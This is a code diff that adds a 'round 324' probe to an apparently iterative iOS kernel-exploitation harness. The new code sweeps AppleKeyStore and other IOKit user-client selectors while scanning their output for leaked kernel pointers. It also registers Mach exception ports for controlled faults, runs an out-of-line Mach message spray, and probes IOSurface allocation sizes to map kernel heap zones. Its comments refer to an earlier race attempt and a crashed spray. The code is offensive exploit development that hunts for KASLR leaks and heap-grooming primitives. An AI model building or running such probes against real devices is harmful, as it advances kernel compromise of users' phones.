@@ -7726,6 +7726,345 @@ r323_done:
     fflush(stdout);
 }
 
+static void r324_probe(void) {
+    rlog("\n=== r324: AKS Full Sweep + Refined Race + Exception Port ===\n");
+    rlog("  Strategy: AKS selector sweep (safe), Mach exception port, refined timing\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    /* ---- Part 1: AppleKeyStore full selector sweep (safe, no crash) ---- */
+    rlog("--- Part 1: AppleKeyStore full selector sweep ---\n");
+    fflush(stdout);
+    {
+        io_service_t aks_svc = IOServiceGetMatchingService(kIOMainPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        rlog("  AppleKeyStore service: 0x%x\n", aks_svc);
+
+        if (aks_svc) {
+            /* Try all 5 connection types */
+            for (uint32_t ctype = 0; ctype < 5; ctype++) {
+                io_connect_t conn = 0;
+                kr = IOServiceOpen(aks_svc, mach_task_self(), ctype, &conn);
+                if (kr != 0) continue;
+                rlog("  Type %u conn=0x%x\n", ctype, conn);
+
+                int nonzero_sels = 0;
+                int kptr_hits = 0;
+
+                for (uint32_t sel = 0; sel < 50; sel++) {
+                    uint8_t out[2048];
+                    memset(out, 0, sizeof(out));
+                    size_t outSz = 2048;
+                    uint64_t scalarOut[16];
+                    uint32_t scalarOutCnt = 16;
+
+                    /* Scalar call with no input */
+                    kr = IOConnectCallMethod(conn, sel,
+                        NULL, 0, NULL, 0,
+                        scalarOut, &scalarOutCnt, out, &outSz);
+
+                    if (kr == 0) {
+                        int hasData = 0;
+                        for (size_t i = 0; i < outSz && i < 2048; i++) {
+                            if (out[i] != 0) { hasData = 1; break; }
+                        }
+                        for (uint32_t i = 0; i < scalarOutCnt; i++) {
+                            if (scalarOut[i] != 0) { hasData = 1; break; }
+                        }
+
+                        if (hasData) {
+                            nonzero_sels++;
+                            rlog("  T%u sel=%u: outSz=%zu scalars=%u DATA\n",
+                                 ctype, sel, outSz, scalarOutCnt);
+                            for (uint32_t i = 0; i < scalarOutCnt; i++) {
+                                if (scalarOut[i] != 0)
+                                    rlog("    s[%u]=0x%llx\n", i, scalarOut[i]);
+                                if ((scalarOut[i] >> 28) == 0xfffffffULL) {
+                                    rlog("    !!! KPTR: 0x%llx !!!\n", scalarOut[i]);
+                                    kptr_hits++;
+                                }
+                            }
+                            /* Scan struct output for kernel pointers */
+                            uint64_t *qw = (uint64_t *)out;
+                            for (size_t i = 0; i < outSz / 8 && i < 256; i++) {
+                                if ((qw[i] >> 28) == 0xfffffffULL &&
+                                    qw[i] != 0xffffffffffffffffULL) {
+                                    rlog("    !!! KPTR struct[%zu]: 0x%llx !!!\n", i * 8, qw[i]);
+                                    kptr_hits++;
+                                }
+                            }
+                            if (outSz > 0 && outSz <= 2048) {
+                                rlog("    hex: ");
+                                for (int i = 0; i < 32 && (size_t)i < outSz; i++)
+                                    rlog("%02x", out[i]);
+                                rlog("\n");
+                            }
+                        }
+                    }
+
+                    /* Also try with struct input (64 bytes of zeros) */
+                    if (kr != 0) {
+                        uint8_t structIn[64];
+                        memset(structIn, 0, sizeof(structIn));
+                        memset(out, 0, sizeof(out));
+                        outSz = 2048;
+                        scalarOutCnt = 16;
+                        kr = IOConnectCallMethod(conn, sel,
+                            NULL, 0, structIn, 64,
+                            scalarOut, &scalarOutCnt, out, &outSz);
+                        if (kr == 0) {
+                            int hasData = 0;
+                            for (size_t i = 0; i < outSz && i < 2048; i++) {
+                                if (out[i] != 0) { hasData = 1; break; }
+                            }
+                            if (hasData) {
+                                nonzero_sels++;
+                                rlog("  T%u sel=%u(struct): outSz=%zu DATA\n", ctype, sel, outSz);
+                                uint64_t *qw = (uint64_t *)out;
+                                for (size_t i = 0; i < outSz / 8 && i < 256; i++) {
+                                    if ((qw[i] >> 28) == 0xfffffffULL &&
+                                        qw[i] != 0xffffffffffffffffULL) {
+                                        rlog("    !!! KPTR struct[%zu]: 0x%llx !!!\n", i * 8, qw[i]);
+                                        kptr_hits++;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                rlog("  T%u sweep: %d data sels, %d kptr\n", ctype, nonzero_sels, kptr_hits);
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(aks_svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: Other IOKit services selector sweep ---- */
+    rlog("\n--- Part 2: IOKit service selector sweep (AppleAVE2, IOSurface, AppleH13) ---\n");
+    fflush(stdout);
+    {
+        const char *service_names[] = {
+            "IOSurfaceRoot", "AppleSPU", "AppleH13CamIn",
+            "AppleMobileFileIntegrity", "IOHIDSystem",
+            NULL
+        };
+
+        for (int sn = 0; service_names[sn]; sn++) {
+            io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+                IOServiceMatching(service_names[sn]));
+            if (!svc) {
+                rlog("  %s: not found\n", service_names[sn]);
+                continue;
+            }
+
+            io_connect_t conn = 0;
+            kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            rlog("  %s: svc=0x%x open kr=0x%x conn=0x%x\n", service_names[sn], svc, kr, conn);
+
+            if (kr == 0 && conn) {
+                int kptr_hits = 0;
+                for (uint32_t sel = 0; sel < 30; sel++) {
+                    uint8_t out[1024];
+                    memset(out, 0, sizeof(out));
+                    size_t outSz = 1024;
+                    uint64_t scalarOut[8];
+                    uint32_t scalarOutCnt = 8;
+
+                    kr = IOConnectCallMethod(conn, sel,
+                        NULL, 0, NULL, 0,
+                        scalarOut, &scalarOutCnt, out, &outSz);
+
+                    if (kr == 0) {
+                        /* Check for non-zero data */
+                        int hasData = 0;
+                        for (uint32_t i = 0; i < scalarOutCnt; i++)
+                            if (scalarOut[i]) hasData = 1;
+                        for (size_t i = 0; i < outSz; i++)
+                            if (out[i]) { hasData = 1; break; }
+
+                        if (hasData) {
+                            rlog("  %s sel=%u: outSz=%zu scalars=%u\n",
+                                 service_names[sn], sel, outSz, scalarOutCnt);
+                            for (uint32_t i = 0; i < scalarOutCnt; i++) {
+                                if (scalarOut[i]) {
+                                    rlog("    s[%u]=0x%llx\n", i, scalarOut[i]);
+                                    if ((scalarOut[i] >> 28) == 0xfffffffULL) {
+                                        rlog("    !!! KPTR: 0x%llx !!!\n", scalarOut[i]);
+                                        kptr_hits++;
+                                    }
+                                }
+                            }
+                            uint64_t *qw = (uint64_t *)out;
+                            for (size_t i = 0; i < outSz / 8; i++) {
+                                if ((qw[i] >> 28) == 0xfffffffULL &&
+                                    qw[i] != 0xffffffffffffffffULL) {
+                                    rlog("    !!! KPTR: 0x%llx !!!\n", qw[i]);
+                                    kptr_hits++;
+                                }
+                            }
+                        }
+                    }
+                }
+                if (kptr_hits) rlog("  %s: %d KPTR HITS!\n", service_names[sn], kptr_hits);
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: Mach exception port for controlled faults ---- */
+    rlog("\n--- Part 3: Mach exception port probe ---\n");
+    fflush(stdout);
+    {
+        /* Set up exception port on our task */
+        mach_port_t exc_port;
+        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc_port);
+        rlog("  Exception port alloc: kr=0x%x port=0x%x\n", kr, exc_port);
+
+        if (kr == 0) {
+            kr = mach_port_insert_right(mach_task_self(), exc_port, exc_port,
+                MACH_MSG_TYPE_MAKE_SEND);
+
+            /* Try to set exception port for EXC_BAD_ACCESS */
+            kr = task_set_exception_ports(mach_task_self(),
+                EXC_MASK_BAD_ACCESS,
+                exc_port,
+                EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
+                ARM_THREAD_STATE64);
+            rlog("  task_set_exception_ports: kr=0x%x\n", kr);
+
+            /* Get current exception ports to check what's set */
+            exception_mask_t masks[32];
+            mach_msg_type_number_t count = 32;
+            mach_port_t ports[32];
+            exception_behavior_t behaviors[32];
+            thread_state_flavor_t flavors[32];
+            kr = task_get_exception_ports(mach_task_self(),
+                EXC_MASK_ALL,
+                masks, &count, ports, behaviors, flavors);
+            rlog("  task_get_exception_ports: kr=0x%x count=%u\n", kr, count);
+            for (mach_msg_type_number_t i = 0; i < count && i < 32; i++) {
+                rlog("    [%u] mask=0x%x port=0x%x behavior=0x%x flavor=%u\n",
+                     i, masks[i], ports[i], behaviors[i], flavors[i]);
+            }
+
+            mach_port_deallocate(mach_task_self(), exc_port);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: Safe OOL message spray (small count) ---- */
+    rlog("\n--- Part 4: Safe OOL descriptor spray ---\n");
+    fflush(stdout);
+    {
+        mach_port_t recv;
+        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv);
+        if (kr == 0) {
+            kr = mach_port_insert_right(mach_task_self(), recv, recv, MACH_MSG_TYPE_MAKE_SEND);
+
+            uint8_t data[256];
+            memset(data, 0xCC, sizeof(data));
+            int sent = 0;
+
+            for (int i = 0; i < 10; i++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                } msg;
+                memset(&msg, 0, sizeof(msg));
+                msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_remote_port = recv;
+                msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                msg.hdr.msgh_id = 0x42;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.address = data;
+                msg.ool.size = sizeof(data);
+                msg.ool.deallocate = FALSE;
+                msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0,
+                    MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                if (kr == 0) sent++;
+            }
+            rlog("  Sent: %d OOL messages\n", sent);
+
+            /* Receive and check addresses */
+            for (int i = 0; i < sent; i++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                    mach_msg_trailer_t trailer;
+                } rmsg;
+                memset(&rmsg, 0, sizeof(rmsg));
+                kr = mach_msg(&rmsg.hdr, MACH_RCV_MSG, 0, sizeof(rmsg),
+                    recv, 0, MACH_PORT_NULL);
+                if (kr == 0) {
+                    rlog("  OOL[%d]: addr=0x%llx size=%u\n",
+                         i, (uint64_t)rmsg.ool.address, rmsg.ool.size);
+                    if (rmsg.ool.address && rmsg.ool.size)
+                        mach_vm_deallocate(mach_task_self(),
+                            (mach_vm_address_t)rmsg.ool.address, rmsg.ool.size);
+                }
+            }
+            mach_port_deallocate(mach_task_self(), recv);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: IOSurface PurpleGfxMem allocation type probe ---- */
+    rlog("\n--- Part 5: IOSurface allocation type probing ---\n");
+    fflush(stdout);
+    {
+        IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_fn idFn = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        IOSurfaceGetBaseAddress_fn baFn = (IOSurfaceGetBaseAddress_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        IOSurfaceGetAllocSize_fn asFn = (IOSurfaceGetAllocSize_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        IOSurfaceLock_fn lkFn = (IOSurfaceLock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        IOSurfaceUnlock_fn ulFn = (IOSurfaceUnlock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+        IOSurfaceCreateMachPort_fn cpFn = (IOSurfaceCreateMachPort_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+
+        if (cFn && idFn && baFn && lkFn && ulFn && asFn) {
+            /* Try different allocation sizes to see if kernel uses different zones */
+            int sizes[][2] = {{16,16},{64,64},{256,256},{1024,1},{1,1024},{4096,1}};
+            for (int s = 0; s < 6; s++) {
+                int w = sizes[s][0], h = sizes[s][1], bpe = 4, pf = 0x42475241;
+                CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                    CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+                const void *vs[] = {wV, hV, bV, pV};
+                CFDictionaryRef pr = CFDictionaryCreate(NULL, ks, vs, 4,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                void *surf = cFn(pr);
+                if (surf) {
+                    uint32_t sid = idFn(surf);
+                    size_t asz = asFn(surf);
+                    lkFn(surf, 0, NULL);
+                    void *ba = baFn(surf);
+                    mach_port_t mp = cpFn ? cpFn(surf) : 0;
+                    rlog("  %dx%d: id=%u alloc=%zu base=%p port=0x%x\n",
+                         w, h, sid, asz, ba, mp);
+                    ulFn(surf, 0, NULL);
+                    CFRelease(surf);
+                }
+                CFRelease(pr); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r324 complete ===\n");
+    fflush(stdout);
+}
+
 static void r317_probe(void) {
     rlog("\n=== r317: Deep AppleKeyStore + AppleJPEGDriver + CredentialManager ===\n\n");
     fflush(stdout);
@@ -38538,6 +38877,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 324) {
+            rlog("*** rounds=324: AKS Full Sweep + IOKit Svc Sweep + Exception Port ***\n");
+            rlog("  r323: IOSurface+pipe works, race 0 kptrs, OOL crashed.\n");
+            rlog("  Probe: AKS 5 types x50 sel, IOKit services, exception port, OOL safe.\n\n");
+            r324_probe();
             goto done;
         }
         if (rounds == 323) {
